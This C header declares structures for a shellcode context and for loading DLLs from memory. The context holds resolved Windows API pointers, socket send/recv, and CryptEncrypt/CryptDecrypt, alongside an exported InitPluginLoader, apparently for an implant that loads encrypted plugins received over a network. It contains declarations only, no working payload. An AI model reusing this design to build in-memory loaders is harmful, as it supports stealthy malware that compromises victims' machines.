#ifndef __MAIN_H__
#define __MAIN_H__

#include <windows.h>
#include <wincrypt.h>

typedef struct _UNICODE_STRING {
    USHORT              Length;
    USHORT              MaximumLength;
    PWSTR               Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_MODULE {
    LIST_ENTRY          InLoadOrderLinks;
    LIST_ENTRY          InMemoryOrderLinks;
    LIST_ENTRY          InInitializationOrderLinks;
    PVOID               DllBase;
    PVOID               EntryPoint;
    ULONG               SizeOfImage;
    UNICODE_STRING      FullDllName;
    UNICODE_STRING      BaseDllName;
    ULONG               Flags;
    WORD                LoadCount;
    WORD                TlsIndex;
    PVOID               SectionPointer;
    ULONG               CheckSum;
    ULONG               TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;

typedef struct {
    PIMAGE_NT_HEADERS   headers;
    HINSTANCE           ModuleBase;
    HMODULE             *modules;
    int                 numModules;
    PLDR_MODULE         ldr_mod;
} MEMORYMODULE, *PMEMORYMODULE;

struct SHELLCODE_CONTEXT;

typedef int (WINAPI *PLoadLibraryFromMemory)(SHELLCODE_CONTEXT* pSCC,const void *data, LPCWSTR dllname, PMEMORYMODULE result);
typedef void (WINAPI *PFreeLibraryFromMemory)(SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module);

typedef struct SHELLCODE_CONTEXT{
    HMODULE                 NTDLL;
    PVOID                   memcpy_;
    PVOID                   memset_;
    PVOID                   RtlReAllocateHeap_;
    PVOID                   RtlAllocateHeap_;
    PVOID                   RtlFreeHeap_;
    HMODULE                 KERNEL32;
    PVOID                   LoadLibraryA_;
    PVOID                   FreeLibrary_;
    PVOID                   GetProcAddressA_;
    PVOID                   GetProcessHeap_;
    PVOID                   IsBadReadPtr_;
    PVOID                   VirtualAlloc_;
    PVOID                   VirtualFree_;
    PVOID                   VirtualProtect_;
    PVOID                   TlsAlloc_;
    PVOID                   TlsFree_;
    PVOID                   TlsSetValue_;
    PVOID                   TlsGetValue_;
    HMODULE                 WS2_32;
    PVOID                   recv_;
    PVOID                   send_;
    HMODULE                 ADVAPI32;
    PVOID                   CryptDecrypt_;
    PVOID                   CryptEncrypt_;
    HMODULE                 MSVCRT;
    PVOID                   malloc__;
    PVOID                   free_;
    /**/
    SOCKET                  hSocket;
    HCRYPTKEY               hKey;
    PLoadLibraryFromMemory  LoadLibraryFromMemory;
    PFreeLibraryFromMemory  FreeLibraryFromMemory;
}SHELLCODE_CONTEXT,*PSHELLCODE_CONTEXT;

/*
typedef struct LoaderFunTable{
    //Puntero a las funciones para la carga y descarga de modulos desde memoria
    HINSTANCE (__stdcall *LoadLibraryFromMemoy)(void* AddrBase,const char* ModName);
    void* (__stdcall *FreeLibraryFromMemoy)(void* AddrBase);

    //Puntero a los punteros que usan las funiones anteriores para estas apis
    //Estan en una zona con permisos ReadExecute, pero se pueden cambiar
    unsigned long** LoadLibraryA;
    unsigned long** GetProcAddress;
}LoaderFunTable;
*/

extern "C"
{
	bool __declspec(dllexport) WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
	int __declspec(dllexport) WINAPI InitPluginLoader(PSHELLCODE_CONTEXT pSCC);
}

#endif // __MAIN_H__
